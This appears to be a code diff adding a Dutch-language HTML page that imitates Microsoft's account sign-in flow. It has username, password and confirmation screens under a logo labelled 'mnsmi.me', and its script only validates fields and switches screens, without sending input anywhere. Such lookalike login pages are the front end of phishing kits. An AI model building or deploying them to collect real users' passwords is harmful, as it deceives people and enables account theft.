@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/" />
+    <title>Aanmelden bij uw account</title>
+    <link rel="stylesheet" href="page-style.css">
+    <link rel="icon" href="assets/favicon.ico">
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img class="logo" src="assets/logo.png" alt="mnsmi.me" />
+            <h2 class="title mb-16 mt-16">Aanmelden</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Gebruikersnaam of e-mailadres" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Heeft u geen toegang tot het account?
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Doorgaan</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Aanmeldingsopties</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img class="logo" src="assets/logo.png" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Wachtwoord invoeren</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Wachtwoord" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Wachtwoord vergeten?</a></p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Aanmelden</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img class="logo" src="assets/logo.png" alt="mnsmi.me" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Doorgaan met aanmelden?</h2>
+            <p class="p">Wanneer u zich aanmeldt, wordt uw account gebruikt om u aan te melden bij andere Microsoft-apps en -services.</p>
+            <p class="p">Meer informatie op <a class="mb-16 b3-y" href="https://aka.ms/sso-info"><b>aka.ms/sso-info</b></a></p>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">Kan niet aanmelden</button>
+                <button class="btn" id="btn_final">Doorgaan</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script>
+        const unReq = "Voer een geldig e-mailadres, telefoonnummer of Skype-naam in."
+        const pwdReq = "Please enter the password for your Microsoft account."
+        const unameInp = document.getElementById('inp_uname');
+        const pwdInp = document.getElementById('inp_pwd');
+        let view = "uname";
+
+        let unameVal = pwdVal = false;
+        const nxt = document.getElementById('btn_next');
+
+        nxt.addEventListener('click', () => {
+            validate();
+            if (unameVal) {
+                document.getElementById("section_uname").classList.toggle('d-none');
+                document.getElementById('section_pwd').classList.remove('d-none');
+                document.querySelectorAll('#user_identity').forEach((e) => {
+                    e.innerText = unameInp.value;
+                })
+                view = "pwd";
+            }
+        })
+
+        const sig = document.getElementById('btn_sig');
+
+        sig.addEventListener('click', () => {
+            validate();
+            if (pwdVal) {
+                document.getElementById("section_pwd").classList.toggle('d-none');
+                document.getElementById('section_final').classList.remove('d-none');
+                view = "final";
+            }
+        })
+
+        function validate() {
+            function unameValAction(type) {
+                if (!type) {
+                    document.getElementById('error_uname').innerText = unReq;
+                    unameInp.classList.toggle('error-inp');
+                    unameVal = false;
+                } else {
+                    document.getElementById('error_uname').innerText = "";
+                    unameInp.classList.remove('error-inp')
+                    unameVal = true;
+                }
+
+            }
+            function pwdValAction(type) {
+                if (!type) {
+                    document.getElementById('error_pwd').innerText = pwdReq;
+                    pwdInp.classList.toggle('error-inp')
+                    pwdVal = false;
+                } else {
+                    document.getElementById('error_pwd').innerText = "";
+                    pwdInp.classList.remove('error-inp')
+                    pwdVal = true;
+                }
+
+            }
+            if (view === "uname") {
+                if (unameInp.value.trim() === "") {
+                    unameValAction(false);
+                } else {
+                    unameValAction(true);
+                }
+                unameInp.addEventListener('change', function () {
+                    if (this.value.trim() === "") {
+                        unameValAction(false);
+                    } else {
+                        unameValAction(true);
+                    }
+                })
+            } else if (view === "pwd") {
+                if (pwdInp.value.trim() === "") {
+                    pwdValAction(false);
+                } else {
+                    pwdValAction(true);
+                }
+                pwdInp.addEventListener('change', function () {
+                    if (this.value.trim() === "") {
+                        pwdValAction(false);
+                    } else {
+                        pwdValAction(true);
+                    }
+                })
+            }
+            return false;
+        }
+
+        document.querySelector('.back').addEventListener('click', () => {
+            view = "uname";
+            document.getElementById("section_pwd").classList.toggle('d-none');
+            document.getElementById('section_uname').classList.remove('d-none');
+        })
+    </script>
+</body>
+
+</html>
